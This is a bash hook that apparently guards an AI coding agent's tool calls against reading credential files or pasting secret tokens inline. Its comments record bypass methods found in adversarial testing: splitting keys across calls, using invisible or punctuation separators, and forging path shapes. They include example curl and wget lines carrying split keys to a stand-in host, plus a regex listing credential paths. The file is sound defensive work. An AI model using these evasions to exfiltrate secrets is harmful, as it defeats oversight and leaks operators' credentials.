#!/usr/bin/env bash
# PreToolUse hook: block reads of secret-bearing files (<project-a>, local-only).
# Rationale: 2026-05-31 a secret file was read into the transcript, leaking keys.
# Blocks Read/Grep/Bash access to ~/.zshrc, secrets.zsh, .env*, *.pem, id_*.
# Exit 2 = deny (message on stderr -> shown to model). Exit 0 = allow.
#
# THREAT MODEL, stated because six adversarial passes on 2026-08-29 kept re-deriving it.
# This hook stops an ACCIDENT: a careless read of a credential file, a key pasted inline
# into a command, a secret about to be written into the transcript. It does NOT stop a
# deliberate exfiltrator, and cannot: whoever wants a key out splits it across two separate
# tool calls, and no PreToolUse hook can rejoin what it never sees together.
#
# KNOWN LIMIT, tested rather than hidden (see "documented limit" in the test suite):
# the content scan leans on maskSecret's LONG_TOKEN, a LENGTH rule with a \b boundary, and
# \b treats every character outside [A-Za-z0-9_] as a boundary. Invisible separators are
# stripped before measuring (Unicode Cc/Cf/Zl/Zp/Mn, and Zs other than a space), but VISIBLE
# punctuation is not, so
#     curl -s https://x/e?v=<20 chars>U+00B7<20 chars>
# reads as two short runs and is allowed. Closing it means deleting every non-[A-Za-z0-9_-]
# character inside a word, which welds an ordinary API URL into a 50+ run and blocks it —
# measured, and rejected as worse than the hole. The real fix belongs one layer down, in
# omniroute-mask-secrets.mjs, where a length heuristic could become an entropy one.
set -euo pipefail

payload="$(cat)"

# Extract the fields we care about without requiring jq.
#
# EVERY CONTROL BYTE BECOMES A SPACE, and that is load-bearing twice over (2026-08-29,
# fourth adversarial pass; the hole predates all of this and is present on origin/main).
#   1. `mapfile -t` reads one field per LINE. A `\n` inside `command` shifted every field
#      after it, so `pattern` and `cwd` were read from fragments of the command.
#   2. maskSecret's LONG_TOKEN is /\b[A-Za-z0-9_-]{40,}\b/, and `\b` fires on a control
#      byte too. Splitting a 40-char key with one `\t`, `\r` or `\n` left two short runs
#      and the whole content scan went quiet:
#        curl -s https://x/e?v=aB3xK9mQ7wZ2pL5nR8t<TAB>Y4vC6hJ1sD0gF3kM7bN2q   -> allowed
#      JSON carries \n, \r and \t as real bytes in the decoded string, so this is one
#      ordinary single-line tool call, not an exotic payload.
# Replacing with a space keeps the field alignment and the word boundaries honest, but it
# does NOT recover the key: `aB3x…<TAB>…bN2q` simply becomes two short WORDS, still under
# 40, still quiet. So a SECOND copy is emitted with the control bytes DELETED, and the scan
# runs on both. Splicing cannot invent a token: maskSecret wants token-like VARIETY, not
# just 40+ characters, so two innocent lowercase words joined by a tab stay unflagged.
# That was written here as an accepted false positive first; the measurement said no, and
# there is a test pinning it.
# The python lives in a QUOTED heredoc, and that is a bug fix, not a style choice. It used
# to sit in a bash double-quoted string, where a backtick is command substitution and `$` is
# expansion — including inside the python's own COMMENTS. Two comments quoting accented
# letters made this hook run them as commands, plus a real grep, on EVERY tool call:
#   block-secret-reads.sh: line 29: c-cedilla: command not found
#   grep: .../<a path>: No such file or directory
# Silent, unconditional, input-independent (sixth adversarial pass). A comment inside a
# double-quoted string is not inert. <<'PYEOF' quotes the whole body, so nothing expands and
# no future edit to this block can execute anything.
PYSRC="$(cat <<'PYEOF'
import sys,json,re,os,unicodedata
CTRL=re.compile(r'[\x00-\x1f\x7f]')
# The spliced copy drops separators BY UNICODE CATEGORY, a closed set, instead of by a list
# of codepoints, which is a race nobody wins. Blacklisting \x00-\x1f closed \t \r \n and
# left U+200B, U+00A0, U+2028, U+FEFF, U+3000 and a combining accent doing exactly the same
# job (fifth pass): maskSecret's \b breaks on any of them, so the key becomes two short runs
# and the length rule goes quiet.
#
# Cc control, Cf format, Zl/Zp line and paragraph separators, Mn nonspacing marks, and Zs
# spaces EXCEPT the ordinary 0x20. Two exclusions are load-bearing:
#   - keeping U+0020 stops unrelated words from being welded into a run nobody typed
#   - an accented letter is Ll, not a separator, so it SURVIVES. Stripping all non-ASCII was
#     the obvious version and it was wrong: it de-accented a real path, the de-accented name
#     did not exist, the existence exemption stopped applying, and an ordinary grep blocked.
DROP={'Cc','Cf','Zl','Zp','Mn'}
# A LINE BREAK IS A REAL SEPARATOR AND MUST NOT BE DELETED. Deleting it welded the end of one
# line to the start of the next: `F="/a/b/<long name>.md"` + newline + `echo x` became one
# token ending `.md"echo`, which does not exist on disk, so the existence exemption never
# applied and an ordinary read blocked. That fired six times in one afternoon (2026-08-29).
# ONLY the line feed. A tab, a CR and a vertical tab stay deleted: those INSIDE a pasted key
# are the splice this copy exists to defeat, and the suite pins the CR case. A key broken
# across two real lines is not what an accident looks like.
NEWLINEISH='\n'
def d_(v):
    if not isinstance(v,str): return ''
    return ''.join(' ' if c in NEWLINEISH else c
                   for c in v
                   if c in NEWLINEISH
                   or not (unicodedata.category(c) in DROP
                           or (unicodedata.category(c)=='Zs' and c != ' ')))
def s(v): return CTRL.sub(' ', v if isinstance(v,str) else '')

# TOKENISE RESPECTING QUOTES, NOT BY SPLITTING ON SPACES. Splitting on spaces cut
#   cat "/Volumes/My Drive/x/<long name>"
# into `/Volumes/My` and `Drive/x/<long name>`; the second fragment does not start with a
# slash, does not exist relative to the cwd, so the existence exemption never applied and an
# ordinary read of this machine's own working directory was refused as a credential. On this
# machine nearly every path carries that space.
#
# shlex was the obvious tool and it was the wrong one: on a real command line with $((...))
# or nested quotes it raises "No closing quotation", and the fallback was a naive split that
# reintroduced the exact bug — caught because the hook blocked the very command being used to
# verify the fix. A quoted run has to hold together even when the REST of the line does not
# parse, so this is a regex that cannot raise: a double-quoted run, a single-quoted run, or a
# stretch of non-whitespace, in that order.
# ...AND THE REGEX ONLY HELD A QUOTED RUN TOGETHER WHEN THE TOKEN STARTED WITH THE QUOTE.
# `F="${DEV_ROOT}/..."` starts with `F=`, so `\S+` won took over and cut at the
# space again — the same bug, one character to the right, and it blocked five reads before
# it was named (2026-08-29). Scan instead: whitespace separates only OUTSIDE quotes. An
# unterminated quote swallows the rest of the line, which is the safe direction: the joined
# token will not exist on disk, so nothing gets exempted by accident.
def TOKENS(text):
    out, cur, quote = [], [], None
    for ch in text:
        if quote:
            cur.append(ch)
            if ch == quote: quote = None
        elif ch in '"\'':
            quote = ch; cur.append(ch)
        elif ch.isspace():
            if cur: out.append(''.join(cur)); cur = []
        else:
            cur.append(ch)
    if cur: out.append(''.join(cur))
    return out
LEAD=re.compile(r'^[^A-Za-z0-9_./~-]*')
TAIL=re.compile(r'[^A-Za-z0-9_./~-]*$')
# The space belongs in this class. The token reaching COLLAPSE has ALREADY been proven to
# exist on disk, so a run with a space in it is a real directory or file name, not a
# pasted key: no credential contains a literal space. Leaving it out meant a single
# component that was both >=40 chars and had a space in it never collapsed, and the
# length rule then fired on a file the operator plainly owns (2026-08-29).
COLLAPSE=re.compile(r'(^|/)[A-Za-z0-9_ -]{40,}(/|\.|$)')
def candidates(w):
    # A path can arrive wearing a prefix: `F="/a/b"`, `--file="/a/b"`, `out=/a/b`. Quotes are
    # not part of any filename, and what follows the first `=` is the value. Probing only the
    # raw token missed all of these, and a missed probe means no exemption, which means a
    # legitimate long filename blocks.
    bare = w.replace('"','').replace("'",'')
    yield bare
    if '=' in bare:
        yield bare.split('=',1)[1]
def prefilter(text, cwd, home):
    out=[]
    for w in TOKENS(text):
        w = TAIL.sub('', LEAD.sub('', w))
        if not w: continue
        exists = False
        for c in candidates(w):
            if not c: continue
            if c.startswith('~/'):  probe = os.path.join(home, c[2:])
            elif c.startswith('/'): probe = c
            else:                   probe = os.path.join(cwd or '.', c)
            try: exists = os.path.exists(probe)
            except (OSError, ValueError): exists = False
            if exists: break
        if exists:
            w = COLLAPSE.sub(lambda m: m.group(1)+'PATHSEG'+m.group(2), w)
        out.append(w)
    return ' '.join(out)
try:
    d=json.load(sys.stdin); ti=d.get('tool_input',{})
    cwd=s(d.get('cwd','') or ''); home=os.environ.get('HOME','')
    print(s(d.get('tool_name','')))
    print(s(ti.get('file_path','')))
    print(s(ti.get('path','')))
    print(s(ti.get('command','')))
    print(s(ti.get('pattern','')))
    print(s(d.get('cwd','') or ''))
    # The two scan copies, already tokenised and path-exempted. This used to be a bash
    # `while read` loop spawning a subshell per word; doing it here is the same rule with the
    # quoting understood and one process instead of dozens.
    plain = s(ti.get('command','')) + ' ' + s(ti.get('pattern',''))
    spliced = d_(ti.get('command','')) + ' ' + d_(ti.get('pattern',''))
    print(prefilter(plain, cwd, home))
    print(prefilter(spliced, cwd, home))
except Exception:
    pass
PYEOF
)"
field() { printf '%s' "$payload" | python3 -c "$PYSRC" 2>/dev/null; }

mapfile -t f < <(field)
tool="${f[0]:-}"; haystack="${f[1]:-} ${f[2]:-} ${f[3]:-} ${f[4]:-}"
hook_cwd="${f[5]:-}"

# Secret-bearing path patterns (extended regex). Covers shell rc/profile, .env,
# private keys, npm/netrc, and cloud credential stores (AWS / GCP / kube / docker).
secret_re='(^|/|[[:space:]])(\.zshrc|\.zprofile|\.bash_profile|\.bashrc)|secrets\.zsh|(^|/)\.env([.][^/[:space:]]+)?([[:space:]]|$)|\.pem([[:space:]]|$)|(^|/)id_(rsa|ed25519|ecdsa)|\.netrc|\.npmrc|(^|/)\.aws/(credentials|config)|(^|/)\.kube/config|(^|/)\.config/gcloud/[^[:space:]]*credentials|(^|/)\.docker/config\.json'

# Safe templates carry placeholder values, not real secrets — allow them.
safe_re='\.env\.(example|sample|template|dist|defaults)([.][^/[:space:]]+)?([[:space:]]|/|$)'

if printf '%s' "$haystack" | grep -qE "$safe_re"; then
    exit 0
fi

if printf '%s' "$haystack" | grep -qE "$secret_re"; then
    echo "BLOCKED: '$tool' targets a secret-bearing file. Reading it would leak credentials into the transcript (see ~/.claude/standards/shell-secret-management.md). If you genuinely need a value, ask the operator to provide it — do not read the file." >&2
    exit 2
fi

# Content check (distinct from the path check above): catches a secret VALUE
# typed directly into the command/pattern text itself (e.g. a Bearer token or
# sk-/ak-/pk- key pasted inline into a curl command) rather than a read of a
# secret-bearing file. Reuses omniroute-mask-secrets.mjs's maskSecret() —
# masking changed the text = a secret-shaped literal was present.
mask_script="$HOME/.claude/scripts/omniroute-mask-secrets.mjs"
# maskSecret's LONG_TOKEN rule is /\b[A-Za-z0-9_-]{40,}\b/, which also matches a long
# FILENAME or path component. A memory note named
# gotcha_rag_nightly_regression_false_positive_launchd_fda_2026-08-15.md and a session dir
# named -Volumes-My-Drive-Projects-client-knowledge-vault were each refused as a pasted
# credential. Only that ONE rule misfires on paths; sk-/ak-/pk-/Bearer/header shapes never
# do. So the exemption below neutralises long runs inside a path and leaves everything else
# in the word scannable. The secret-bearing PATH rules above are untouched.
#
# THE EXEMPTION IS KEYED ON THE FILE EXISTING, NOT ON THE TEXT LOOKING LIKE A PATH.
# Three adversarial passes killed three shape-based versions in a row on 2026-08-29, and
# each fix only moved the hole, because a shape is something an attacker types:
#   1. drop any word starting with `/`      -> `curl -s "/api?token=sk-..."` lost the
#                                              credential along with the "path"
#   2. collapse instead of drop, plus an    -> `curl -s sk-<40 chars>.js` needed no slash
#      "ends in a known extension" address     at all; a suffix defeated the whole hook
#   3. delete that address                  -> `curl -s /sk-<40 chars>.js` still passed:
#                                              the leading-punctuation trim MANUFACTURES a
#                                              leading slash out of `@`, `"`, `$`, a backtick
# Existence ends the class. `/sk-<key>.js` does not exist, so it is scanned and blocked;
# the session's own task-output path does exist, so its 46-char directory component is
# neutralised. To weaponise this an attacker must first CREATE a file named after the
# credential, and the command that would create it is itself scanned while the path does
# not yet exist, so it blocks. Shape is free to forge; a filesystem entry is not.
#
# The component boundaries are kept as a second lock: the run must sit where a path
# component sits, opened by `/` or the word start, closed by `/`, `.`, or the word end, so
# `wget /d?key=<40 chars>` is left alone even if that path somehow existed.
# Both copies arrive already tokenised and path-exempted from `field()`. This used to be a
# bash `while read` loop that split on spaces and spawned a subshell per word; it now lives
# in the python that already parses the payload, because splitting on spaces cut every path
# on this machine in half at `${DEV_ROOT}/`.
flags() {       # 0 = the mask changed it, i.e. a secret-shaped literal is in there
  local t="$1" m
  [ -n "${t// /}" ] || return 1
  command -v node >/dev/null 2>&1 && [ -f "$mask_script" ] || return 1
  m="$(printf '%s' "$t" | node "$mask_script" 2>/dev/null || printf '%s' "$t")"
  [ "$m" != "$t" ]
}
content="${f[6]:-}"
# The spliced copy is the same text with the separators removed rather than blanked, so a
# key cut in half by a tab or a zero-width space is put back together before it is measured.
content_spliced="${f[7]:-}"
if flags "$content" || flags "$content_spliced"; then
    echo "BLOCKED: '$tool' command/pattern contains a secret-shaped literal (Bearer token, sk-/ak-/pk- key, or long opaque token). Do not paste credentials directly into tool calls. Reference them via an env var or ask the operator." >&2
    exit 2
fi

# Header-shaped check: catches a secret header VALUE that doesn't match
# maskSecret's shape heuristics (e.g. a short Cookie/Set-Cookie session value —
# "session=abc123" isn't Bearer/sk-/40-char-shaped, so the check above misses
# it), by header NAME instead. Reuses the same CLI mode wired into
# memory-write-guard.sh.
header_script="$HOME/.claude/scripts/omniroute-sanitize-headers.mjs"
if [ -n "${content// /}" ] && command -v node >/dev/null 2>&1 && [ -f "$header_script" ]; then
    header_masked="$(printf '%s' "$content" | node "$header_script" 2>/dev/null || printf '%s' "$content")"
    if [ "$header_masked" != "$content" ]; then
        echo "BLOCKED: '$tool' command/pattern contains a secret-bearing header (Authorization/Cookie/Set-Cookie/X-Api-Key/...) with a real-looking value. Do not paste credentials directly into tool calls. Reference them via an env var or ask the operator." >&2
        exit 2
    fi
fi

exit 0
